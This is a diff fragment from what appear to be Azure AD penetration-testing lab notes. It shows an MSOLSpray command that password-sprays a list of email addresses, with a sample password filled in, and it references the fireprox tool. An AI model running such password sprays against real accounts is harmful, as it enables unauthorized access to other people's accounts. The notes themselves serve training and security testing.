@@ -13,7 +13,7 @@
 - https://github.com/ustayready/fireprox
 ```
 . C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
-Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
+Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password V3rYT0pSEcretP@@swordF0rT3st -Verbose
 ```
 
 #### Find valid emails
